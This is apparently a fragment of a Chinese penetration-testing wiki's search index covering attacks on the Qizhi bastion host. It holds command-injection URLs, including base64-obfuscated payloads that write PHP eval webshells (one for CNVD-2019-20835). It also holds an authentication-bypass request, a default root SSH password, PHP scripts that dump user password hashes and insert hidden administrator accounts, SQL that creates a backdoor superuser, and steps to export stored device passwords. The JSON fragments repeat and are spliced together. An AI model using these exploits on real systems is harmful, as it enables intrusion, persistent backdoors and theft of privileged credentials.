/audit/data_provider.php?ds_y=2019&ds_m=04&ds_d=02&ds_hour=09&ds_min40&server_cond=&service=$(id)&identity_cond=&query_type=all&format=json&browse=true \u6216\u8005 /audit/data_provider.php?ds_y=2019&ds_m=04&ds_d=02&ds_hour=09&ds_min40&server_cond=&service=127.0.0.1&identity_cond=&query_type=all&format=json&browse=true&priority=`id` \u5199webshell\u5230 /var/www/icons/tui/ \uff0c\u7136\u540e\u8bbf\u95ee/icons/tui/service.php /audit/data_provider.php?ds_y=2019&ds_m=04&ds_d=02&ds_hour=09&ds_min40&server_cond=&service=127.0.0.1&identity_cond=&query_type=all&format=json&browse=true&priority=`echo${IFS}ZWNobyAnPD9waHAgQGV2YWwoJF9QT1NUWzkwXSk7Pz4nID4gL3Zhci93d3cvaWNvbnMvdHVpL3NlcnZpY2UucGhw|base64${IFS}-d|sh` \u524d\u53f0RCE\uff08CNVD-2019-20835\uff09 \u8bbf\u95ee\u5982\u4e0burl\u8fd4\u56deok\u5373\u5b58\u5728\u3002 /listener/cluster_manage.php \u7136\u540e\u8bbf\u95ee\u5982\u4e0b\u94fe\u63a5\uff0c\u5373\u53ef\u5728\u6839\u76ee\u5f55 /var/www/shterm/resources/qrcode/lbj77.php \u4e0b\u751f\u6210PHP\u4e00\u53e5\u8bdd\u9a6c https://10.20.10.10/ha_request.php?action=install&ipaddr=localhost&node_id=1${IFS}|`echo${IFS}\" ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUWzEwMDg2XSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9sYmo3Ny5waHAK\"|base64${IFS}- d|bash`|${IFS}|echo${IFS} \u7136\u540e\u8bbf\u95ee\u5982\u4e0b\u94fe\u63a5\u5373\u53ef\u4f7f\u7528webshell /resources/qrcode/lbj77.php \u540e\u6e17\u900f \u83b7\u53d6\u7ba1\u7406\u5458\u5bc6\u7801 \u62ff\u5230shell\u540e\uff0c\u5728 /icons/tui/ \u76ee\u5f55\u4e0b\u65b0\u5efa common.php \u6587\u4ef6\uff0c\u7136\u540e\u8bbf\u95ee /icons/tui/common.php \u5373\u53ef\u770b\u5230\u5404\u7528\u6237hash\uff0chash\u53ef\u5230cmd5\u89e3\u5bc6 <?PHP $CONFIG[\"nomenu\"] = true; $CONFIG[\"nochangepw\"] = true; require_once(\"/var/www/shterm/include/common.php\"); $q1 = pg_escape(\"SELECT count(*) FROM identity\"); $r1 = pg_fetch_assoc($q1); echo \"\u7528\u6237\u6570\u91cf\uff1a\"; print_r($r1); $q = pg_escape(\"SELECT * FROM identity\"); $i = 0; while($r = pg_fetch_assoc($q)){ ++$i; echo \" \"; echo \" id \uff1a\" . $r[\"id\"]; if($r[\"status\"] == 1){$status = \"\u5426\";}else{$status = \"\u662f\";} echo \" \u662f\u5426\u7981\u7528 \uff1a\" . $status; if( $r[\"role_admin\"] == 1 && $r[\"role_manager\"] == 1 && $r[\"role_audit\"] == 1 && $r[\"role_shell\"]==1 && $r[\"role_pwrcpt\"]==1 ){ $usertype = \"\u8d85\u7ea7\u7ba1\u7406\u5458\"; }elseif ($r[\"role_admin\"] == 1) { $usertype = \"\u8d85\u7ea7\u7ba1\u7406\u5458\"; }elseif ($r[\"role_manager\"] == 1) { $usertype = \"\u914d\u7f6e\u7ba1\u7406\u5458\"; }elseif ($r[\"role_audit\"] == 1) { $usertype = \"\u5ba1\u8ba1\u7ba1\u7406\u5458\"; }elseif ($r[\"role_shell\"] == 1) { $usertype = \"\u666e\u901a\u7528\u6237\"; }elseif ($r[\"role_pwrcpt\"] == 1) { $usertype = \"\u5bc6\u7801\u4fdd\u7ba1\u5458\"; } echo \" \u7528\u6237\u7c7b\u578b \uff1a\" . $usertype; echo \" \u767b\u5f55\u540d\uff1a\" . $r[\"login\"]; echo \" \u59d3\u540d\uff1a\" . $r['name']; echo \" \u5bc6\u7801\u4fe1\u606f\uff1a\" . $r['auth_data']; } ?> \u65b0\u5efa\u7ba1\u7406\u5458 \u5982\u679c\u7ba1\u7406\u5458\u5bc6\u7801\u5b9e\u5728\u65e0\u6cd5\u89e3\u5bc6\uff0c\u5c31\u65b0\u5efa\u4e00\u4e2a\u5427\u3002 \u5728 /icons/tui/ \u76ee\u5f55\u4e0b\u65b0\u5efa about.php \u6587\u4ef6 \u7528\u6237\u540d\uff1a 360team \u5bc6\u7801\uff1a shterm <?PHP $CONFIG[\"nomenu\"] = true; $CONFIG[\"nochangepw\"] = true; require_once(\"/var/www/shterm/include/common.php\"); $q2 = pg_escape(\"INSERT INTO identity(id,status,login,name,company,department,domain,post,number,email,mobile,auth_method,auth_data,x509_dn,auth,passwd_salt,passwd_sha1,passwd_expire,passwd_change,ipaddr_limit,crypt_passwd,pgp_pubkey,role_admin,role_manager,role_audit,role_shell,role_pwrcpt,default_dept,valid_date1,valid_date2,create_stamp,modify_stamp,create_identity,lastlogin_stamp,tui_client,server_grid_way,remark,theme,client_tuires,client_guires,totp_params,challenge_message,challenge_state,options,attrs,perms) VALUES(100900,'1','360team','360team','','ROOT','1','','','','','1','{\\\"hash\\\": \\\"9a15a976afaefb1d3e1ac21f62be336e2054c3d0\\\", \\\"times\\\": 1, \\\"expire\\\": \\\"\\\", \\\"algo\\\": \\\"shterm1\\\", \\\"salt\\\": \\\"nukj4rT0aa\\\", \\\"change\\\": false}','','native','','',null,null,'','','',1,1,1,1,1,null,null,null,null,'2023-01-13 10:44:17.965318',null,'2023-01-16 13:14:47.295477','','','','','','','','','','{\\\"perms\\\":\\\"\\\"}','','{\\\"manager\\\":[1],\\\"audit\\\":[1],\\\"pwrcpt\\\":[1]}')\"); $r2 = pg_fetch_assoc($q2); echo \"\u65b0\u589e\u7528\u6237\u6210\u529f\"; \u8bbe\u5907\u5bc6\u7801\u5bfc\u51fa \u9996\u5148\u628a\u8d26\u6237\u5f04\u6210\u5bc6\u7801\u4fdd\u7ba1\u5458\u6743\u9650\u3002 \u7136\u540e\u70b9\u51fb\u8d26\u6237\u8bbe\u7f6e\u2192\u4fee\u6539\u8bbe\u7f6e\uff08\u8f93\u5165\u7528\u6237\u7684\u767b\u5f55\u5bc6\u7801\uff09\u2192zip\u6587\u4ef6\u5bc6\u7801\u8bbe\u7f6ezip\u89e3\u538b\u5bc6\u7801\u3002 \u7136\u540e\u5bc6\u7801\u63a7\u5236\u2192\u5bc6\u7801\u5907\u4efd\u5373\u53ef\u5bfc\u51fa\u4e00\u4efd\u5bc6\u7801\u672czip\uff0c\u89e3\u538b\u5bc6\u7801\u4e3a\u521a\u521a\u8bbe\u7f6e\u597d\u7684zip\u89e3\u538b\u5bc6\u7801\u3002 \u5982\u679c\u8981\u8fde\u63a5\u8bbe\u5907\uff0c\u53ef\u4ee5\u76f4\u63a5ssh\u6216\u8005rdp\u4e0a\u53bb\u8fde\uff0c\u7528\u6237\u5bc6\u7801\u4e3a\u5821\u5792\u673aweb\u670d\u52a1\u7684\u7528\u6237\u5bc6\u7801.","title":"\u9f50\u6cbb"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E9%BD%90%E6%B2%BB/%E9%BD%90%E6%B2%BB/#_1","text":"","title":"\u9f50\u6cbb"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E9%BD%90%E6%B2%BB/%E9%BD%90%E6%B2%BB/#_2","text":"\u5821\u5792\u673aJAVA \u9ed8\u8ba4\u53e3\u4ee4 \u524d\u6e17\u900f \u540e\u6e17\u900f \u521b\u5efa\u8d85\u7ea7\u7528\u6237 \u5411\u4e3b\u673a\u4e0b\u53d1\u547d\u4ee4 \u8bbf\u95ee\u8d44\u4ea7 \u5821\u5792\u673aPHP \u524d\u6e17\u900f \u4efb\u610f\u7528\u6237\u767b\u5f55 \u540e\u53f0rce \u524d\u53f0RCE\uff08CNVD-2019-20835\uff09 \u540e\u6e17\u900f \u83b7\u53d6\u7ba1\u7406\u5458\u5bc6\u7801 \u65b0\u5efa\u7ba1\u7406\u5458 \u8bbe\u5907\u5bc6\u7801\u5bfc\u51fa \u600e\u4e48\u5224\u65ad\u5821\u5792\u673a\u662fjava\u8fd8\u662fphp\uff1f\u7528chrome\u63d2\u4ef6wappalyzer\uff01","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E9%BD%90%E6%B2%BB/%E9%BD%90%E6%B2%BB/#java","text":"app=\"\u9f50\u6cbb\u79d1\u6280-\u5821\u5792\u673a\"","title":"\u5821\u5792\u673aJAVA"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E9%BD%90%E6%B2%BB/%E9%BD%90%E6%B2%BB/#_3","text":"\u9ed8\u8ba4\u8d26\u53f7\u5bc6\u7801\u4e3a admin/admin SSH\u7528\u6237\uff1a root SSH\u5bc6\u7801\uff1a 4OO88O2393","title":"\u9ed8\u8ba4\u53e3\u4ee4"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E9%BD%90%E6%B2%BB/%E9%BD%90%E6%B2%BB/#_4","text":"\u65e0\u516c\u5f00\u6f0f\u6d1e","title":"\u524d\u6e17\u900f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E9%BD%90%E6%B2%BB/%E9%BD%90%E6%B2%BB/#_5","text":"","title":"\u540e\u6e17\u900f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E9%BD%90%E6%B2%BB/%E9%BD%90%E6%B2%BB/#_6","text":"\u767b\u5f55\u6570\u636e\u5e93 psql -U shterm -h 127.0.0.1 -d shterm \u6267\u884c INSERT INTO \"public\".\"tbl_user\" (\"id\", \"login_name\", \"user_name\", \"passwd\", \"email\", \"role_id\", \"authtype_id\", \"auth_info\", \"state\", \"ext_info\", \"extra\", \"last_login_time\", \"pwd_change_time\", \"authtoken_id\", \"valid_from\", \"valid_to\", \"pwd_valid\", \"join_time\", \"join_user\", \"update_time\", \"deleted\", \"remark\", \"ssh_key\", \"user_type\", \"region_id\", \"delete_time\", \"disabled_time\", \"department_id\", \"audit_scope\", \"user_category\") VALUES (10088, 'shtermManager', 'shtermManager', '{bcrypt}$2a$10$5Jt5ncvrj5rBZtfQR6YQaeWIuqqJZd1k1KSU23umZeFU89fCYu4la', NULL, 1, 1, '{\"passwordType\": \"custom\"}', 0, '{}', '{\"locale\": {\"country\": \"CN\", \"language\": \"zh\"}, \"userNav\": [{\"name\": \"User.nav_All\", \"useOr\": false, \"filters\": []}, {\"name\": \"role.ROLE_CONFIG\", \"useOr\": false, \"filters\": [{\"attr\": \"role.id\", \"oper\": \"In\", \"value\": \"2\"}]}, {\"name\": \"role.ROLE_ADMIN\", \"useOr\": false, \"filters\": [{\"attr\": \"role.id\", \"oper\": \"In\", \"value\": \"1\"}]}, {\"name\": \"User.nav_NoGroup\", \"useOr\": false, \"filters\": [{\"attr\": \"usergroups\", \"oper\": \"Null\", \"value\": \"true\"}]}, {\"name\": \"User.state.3\", \"useOr\": false, \"filters\": [{\"attr\": \"state\", \"oper\": \"In\", \"value\": \"3\"}]}, {\"name\": \"User.state.2\", \"useOr\": false, \"filters\": [{\"attr\": \"state\", \"oper\": \"In\", \"value\": \"2\"}]}, {\"name\": \"User.state.1\", \"useOr\": false, \"filters\": [{\"attr\": \"state\", \"oper\": \"In\", \"value\": \"1\"}]}, {\"name\": \"User.nav_Inactive\", \"useOr\": true, \"filters\": [{\"attr\": \"lastLoginTime\", \"oper\": \"Before\", \"value\": \"2021-08-21\"}, {\"attr\": \"lastLoginTime\", \"oper\": \"Null\", \"value\": \"true\"}]}], \"appOldNav\": [{\"name\": \"dev.appall\", \"count\": 0, \"useOr\": false, \"filters\": [{\"attr\": \"type\", \"oper\": \"Is\", \"value\": \"3\"}, {\"attr\": \"state\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"deleted\", \"oper\": \"Is\", \"value\": \"false\"}]}, {\"name\": \"B/S\", \"count\": 0, \"useOr\": false, \"filters\": [{\"attr\": \"sysType.name\", \"oper\": \"Contains\", \"value\": \"B/S\"}, {\"attr\": \"type\", \"oper\": \"Is\", \"value\": \"3\"}, {\"attr\": \"state\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"deleted\", \"oper\": \"Is\", \"value\": \"false\"}]}, {\"name\": \"C/S\", \"count\": 0, \"useOr\": false, \"filters\": [{\"attr\": \"sysType.name\", \"oper\": \"Contains\", \"value\": \"C/S\"}, {\"attr\": \"type\", \"oper\": \"Is\", \"value\": \"3\"}, {\"attr\": \"state\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"deleted\", \"oper\": \"Is\", \"value\": \"false\"}]}, {\"name\": \"Weblogic\", \"count\": 0, \"useOr\": false, \"filters\": [{\"attr\": \"sysType.name\", \"oper\": \"Contains\", \"value\": \"Weblogic\"}, {\"attr\": \"type\", \"oper\": \"Is\", \"value\": \"3\"}, {\"attr\": \"state\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"deleted\", \"oper\": \"Is\", \"value\": \"false\"}]}, {\"name\": \"B/S IE\", \"count\": 0, \"useOr\": false, \"filters\": [{\"attr\": \"sysType.name\", \"oper\": \"Contains\", \"value\": \"B/S IE\"}, {\"attr\": \"type\", \"oper\": \"Is\", \"value\": \"3\"}, {\"attr\": \"state\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"deleted\", \"oper\": \"Is\", \"value\": \"false\"}]}], \"devOldNav\": [{\"name\": \"dev.hostall\", \"count\": 0, \"useOr\": false, \"filters\": [{\"attr\": \"type\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"state\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"deleted\", \"oper\": \"Is\", \"value\": \"false\"}]}, {\"name\": \"Linux\", \"count\": 0, \"useOr\": false, \"filters\": [{\"attr\": \"sysType.name\", \"oper\": \"Contains\", \"value\": \"Linux\"}, {\"attr\": \"type\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"state\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"deleted\", \"oper\": \"Is\", \"value\": \"false\"}]}, {\"name\": \"Windows\", \"count\": 0, \"useOr\": false, \"filters\": [{\"attr\": \"sysType.name\", \"oper\": \"Contains\", \"value\": \"Windows\"}, {\"attr\": \"type\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"state\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"deleted\", \"oper\": \"Is\", \"value\": \"false\"}]}, {\"name\": \"HP UX\", \"count\": 0, \"useOr\": false, \"filters\": [{\"attr\": \"sysType.name\", \"oper\": \"Contains\", \"value\": \"HP UX\"}, {\"attr\": \"type\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"state\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"deleted\", \"oper\": \"Is\", \"value\": \"false\"}]}, {\"name\": \"IBM AIX\", \"count\": 0, \"useOr\": false, \"filters\": [{\"attr\": \"sysType.name\", \"oper\": \"Contains\", \"value\": \"IBM AIX\"}, {\"attr\": \"type\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"state\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"deleted\", \"oper\": \"Is\", \"value\": \"false\"}]}, {\"name\": \"IBM AS/400\", \"count\": 0, \"useOr\": false, \"filters\": [{\"attr\": \"sysType.name\", \"oper\": \"Is\", \"value\": \"IBM AS/400\"}, {\"attr\": \"type\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"state\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"deleted\", \"oper\": \"Is\", \"value\": \"false\"}]}], \"accessServ\": {\"changepwd\": 1690250316342, \"automation\": 1690250226507, \"deviceaccess\": 1690199078938}, \"indexWidgets\": [], \"changePlanNav\": [{\"name\": \"secretChangePlan.nav_plan_All\", \"filters\": [{\"attr\": \"status\", \"oper\": \"Is\", \"value\": \"0\"}]}, {\"name\": \"secretChangePlan.nav_plan_maunl\", \"filters\": [{\"attr\": \"execType\", \"oper\": \"Is\", \"value\": \"1\"}, {\"attr\": \"status\", \"oper\": \"Is\", \"value\": \"0\"}]}, {\"name\": \"secretChangePlan.nav_plan_fail\", \"filters\": [{\"attr\": \"execResult\", \"oper\": \"Is\", \"value\": \"2\"}, {\"attr\": \"status\", \"oper\": \"Is\", \"value\": \"0\"}]}], \"updateListNav\": [{\"name\": \"cloud.update.all\", \"useOr\": false, \"filters\": []}, {\"name\": \"cloud.process.1\", \"useOr\": false, \"filters\": [{\"attr\": \"status\", \"oper\": \"Is\", \"value\": \"1\"}]}, {\"name\": \"cloud.process.4\", \"useOr\": false, \"filters\": [{\"attr\": \"status\", \"oper\": \"Is\", \"value\": \"4\"}]}, {\"name\": \"cloud.process.2\", \"useOr\": false, \"filters\": [{\"attr\": \"status\", \"oper\": \"Is\", \"value\": \"2\"}]}, {\"name\": \"cloud.process.3\", \"useOr\": false, \"filters\": [{\"attr\": \"status\", \"oper\": \"Is\", \"value\": \"3\"}]}], \"databaseOldNav\": [{\"name\": \"dev.databaseall\", \"count\": 0, \"useOr\": false, \"filters\": [{\"attr\": \"type\", \"oper\": \"Is\", \"value\": \"2\"}, {\"attr\": \"state\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"deleted\", \"oper\": \"Is\", \"value\": \"false\"}]}, {\"name\": \"Oracle\", \"count\": 0, \"useOr\": false, \"filters\": [{\"attr\": \"sysType.name\", \"oper\": \"Contains\", \"value\": \"Oracle\"}, {\"attr\": \"type\", \"oper\": \"Is\", \"value\": \"2\"}, {\"attr\": \"state\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"deleted\", \"oper\": \"Is\", \"value\": \"false\"}]}, {\"name\": \"MYSQL\", \"count\": 0, \"useOr\": false, \"filters\": [{\"attr\": \"sysType.name\", \"oper\": \"Contains\", \"value\": \"MYSQL\"}, {\"attr\": \"type\", \"oper\": \"Is\", \"value\": \"2\"}, {\"attr\": \"state\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"deleted\", \"oper\": \"Is\", \"value\": \"false\"}]}, {\"name\": \"MSSQL\", \"count\": 0, \"useOr\": false, \"filters\": [{\"attr\": \"sysType.name\", \"oper\": \"Contains\", \"value\": \"MSSQL\"}, {\"attr\": \"type\", \"oper\": \"Is\", \"value\": \"2\"}, {\"attr\": \"state\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"deleted\", \"oper\": \"Is\", \"value\": \"false\"}]}, {\"name\": \"DB2\", \"count\": 0, \"useOr\": false, \"filters\": [{\"attr\": \"sysType.name\", \"oper\": \"Contains\", \"value\": \"DB2\"}, {\"attr\": \"type\", \"oper\": \"Is\", \"value\": \"2\"}, {\"attr\": \"state\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"deleted\", \"oper\": \"Is\", \"value\": \"false\"}]}]}', '2021-11-21 04:04:04.612', '2021-11-21 09:55:32.875', NULL, NULL, NULL, 0, NULL, NULL, '2021-11-21 09:55:32.875', 'f', NULL, NULL, 0, NULL, NULL, NULL, 1, NULL, 0); \u7528\u6237\u540d\uff1ashtermManager \u5bc6\u7801\uff1aShterm10086 \u767b\u5f55\u540e\u4fee\u6539\u5bc6\u7801\uff0c\u5373\u53ef\u83b7\u5f97\u5b8c\u6574\u6743\u9650","title":"\u521b\u5efa\u8d85\u7ea7\u7528\u6237"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E9%BD%90%E6%B2%BB/%E9%BD%90%E6%B2%BB/#_7","text":"\u5de5\u4f5c\u53f0\u2192\u81ea\u52a8\u5316\u2192\u589e\u52a0\u811a\u672c\u4efb\u52a1\u2192\u6dfb\u52a0\u76ee\u6807\u8d44\u4ea7\u2192\u81ea\u5b9a\u4e49\u547d\u4ee4\u2192\u7acb\u5373\u6267\u884c","title":"\u5411\u4e3b\u673a\u4e0b\u53d1\u547d\u4ee4"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E9%BD%90%E6%B2%BB/%E9%BD%90%E6%B2%BB/#_8","text":"web\u670d\u52a1\u8bbf\u95ee\uff1a\u5de5\u4f5c\u53f0\u2192\u8bbf\u95ee\u8d44\u4ea7 rdp\u8bbf\u95ee\uff1ardp\u767b\u5f55\u5821\u5792\u673a\uff0c\u8f93\u5165web\u670d\u52a1\u7684\u8d26\u6237\u5bc6\u7801\uff0c\u8fdb\u53bb\u540e\u5c31\u662f\u53ef\u767b\u5f55\u5217\u8868 ssh\u8bbf\u95ee\uff1a\u8f93\u5165web\u670d\u52a1\u7684\u8d26\u6237\u5bc6\u7801\uff0c\u8fdb\u53bb\u540e\u5c31\u662f\u53ef\u767b\u5f55\u5217\u8868","title":"\u8bbf\u95ee\u8d44\u4ea7"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E9%BD%90%E6%B2%BB/%E9%BD%90%E6%B2%BB/#php","text":"","title":"\u5821\u5792\u673aPHP"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E9%BD%90%E6%B2%BB/%E9%BD%90%E6%B2%BB/#_9","text":"","title":"\u524d\u6e17\u900f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E9%BD%90%E6%B2%BB/%E9%BD%90%E6%B2%BB/#_10","text":"http://xxx.xxx.xxx.xxx/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm \u72b6\u6001\u7801\u8fd4\u56de200\uff0c\u5b58\u5728\u6f0f\u6d1e\uff1b\u201c\u9519\u8befID\u201d\u63d0\u793a\uff0c\u4e0d\u5b58\u5728\u6f0f\u6d1e\u3002","title":"\u4efb\u610f\u7528\u6237\u767b\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E9%BD%90%E6%B2%BB/%E9%BD%90%E6%B2%BB/#rce","text":"/audit/data_provider.php?ds_y=2019&ds_m=04&ds_d=02&ds_hour=09&ds_min40&server_cond=&service=$(id)&identity_cond=&query_type=all&format=json&browse=true \u6216\u8005 /audit/data_provider.php?ds_y=2019&ds_m=04&ds_d=02&ds_hour=09&ds_min40&server_cond=&service=127.0.0.1&identity_cond=&query_type=all&format=json&browse=true&priority=`id` \u5199webshell\u5230 /var/www/icons/tui/ \uff0c\u7136\u540e\u8bbf\u95ee/icons/tui/service.php /audit/data_provider.php?ds_y=2019&ds_m=04&ds_d=02&ds_hour=09&ds_min40&server_cond=&service=127.0.0.1&identity_cond=&query_type=all&format=json&browse=true&priority=`echo${IFS}ZWNobyAnPD9waHAgQGV2YWwoJF9QT1NUWzkwXSk7Pz4nID4gL3Zhci93d3cvaWNvbnMvdHVpL3NlcnZpY2UucGhw|base64${IFS}-d|sh`","title":"\u540e\u53f0rce"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E9%BD%90%E6%B2%BB/%E9%BD%90%E6%B2%BB/#rcecnvd-2019-20835","text":"\u8bbf\u95ee\u5982\u4e0burl\u8fd4\u56deok\u5373\u5b58\u5728\u3002 /listener/cluster_manage.php \u7136\u540e\u8bbf\u95ee\u5982\u4e0b\u94fe\u63a5\uff0c\u5373\u53ef\u5728\u6839\u76ee\u5f55 /var/www/shterm/resources/qrcode/lbj77.php \u4e0b\u751f\u6210PHP\u4e00\u53e5\u8bdd\u9a6c https://10.20.10.10/ha_request.php?action=install&ipaddr=localhost&node_id=1${IFS}|`echo${IFS}\" ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUWzEwMDg2XSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9sYmo3Ny5waHAK\"|base64${IFS}- d|bash`|${IFS}|echo${IFS} \u7136\u540e\u8bbf\u95ee\u5982\u4e0b\u94fe\u63a5\u5373\u53ef\u4f7f\u7528webshell /resources/qrcode/lbj77.php","title":"\u524d\u53f0RCE\uff08CNVD-2019-20835\uff09"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E9%BD%90%E6%B2%BB/%E9%BD%90%E6%B2%BB/#_11","text":"","title":"\u540e\u6e17\u900f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E9%BD%90%E6%B2%BB/%E9%BD%90%E6%B2%BB/#_12","text":"\u62ff\u5230shell\u540e\uff0c\u5728 /icons/tui/ \u76ee\u5f55\u4e0b\u65b0\u5efa common.php \u6587\u4ef6\uff0c\u7136\u540e\u8bbf\u95ee /icons/tui/common.php \u5373\u53ef\u770b\u5230\u5404\u7528\u6237hash\uff0chash\u53ef\u5230cmd5\u89e3\u5bc6 <?PHP $CONFIG[\"nomenu\"] = true; $CONFIG[\"nochangepw\"] = true; require_once(\"/var/www/shterm/include/common.php\"); $q1 = pg_escape(\"SELECT count(*) FROM identity\"); $r1 = pg_fetch_assoc($q1); echo \"\u7528\u6237\u6570\u91cf\uff1a\"; print_r($r1); $q = pg_escape(\"SELECT * FROM identity\"); $i = 0; while($r = pg_fetch_assoc($q)){ ++$i; echo \" \"; echo \" id \uff1a\" . $r[\"id\"]; if($r[\"status\"] == 1){$status = \"\u5426\";}else{$status = \"\u662f\";} echo \" \u662f\u5426\u7981\u7528 \uff1a\" . $status; if( $r[\"role_admin\"] == 1 && $r[\"role_manager\"] == 1 && $r[\"role_audit\"] == 1 && $r[\"role_shell\"]==1 && $r[\"role_pwrcpt\"]==1 ){ $usertype = \"\u8d85\u7ea7\u7ba1\u7406\u5458\"; }elseif ($r[\"role_admin\"] == 1) { $usertype = \"\u8d85\u7ea7\u7ba1\u7406\u5458\"; }elseif ($r[\"role_manager\"] == 1) { $usertype = \"\u914d\u7f6e\u7ba1\u7406\u5458\"; }elseif ($r[\"role_audit\"] == 1) { $usertype = \"\u5ba1\u8ba1\u7ba1\u7406\u5458\"; }elseif ($r[\"role_shell\"] == 1) { $usertype = \"\u666e\u901a\u7528\u6237\"; }elseif ($r[\"role_pwrcpt\"] == 1) { $usertype = \"\u5bc6\u7801\u4fdd\u7ba1\u5458\"; } echo \" \u7528\u6237\u7c7b\u578b \uff1a\" . $usertype; echo \" \u767b\u5f55\u540d\uff1a\" . $r[\"login\"]; echo \" \u59d3\u540d\uff1a\" . $r['name']; echo \" \u5bc6\u7801\u4fe1\u606f\uff1a\" . $r['auth_data']; } 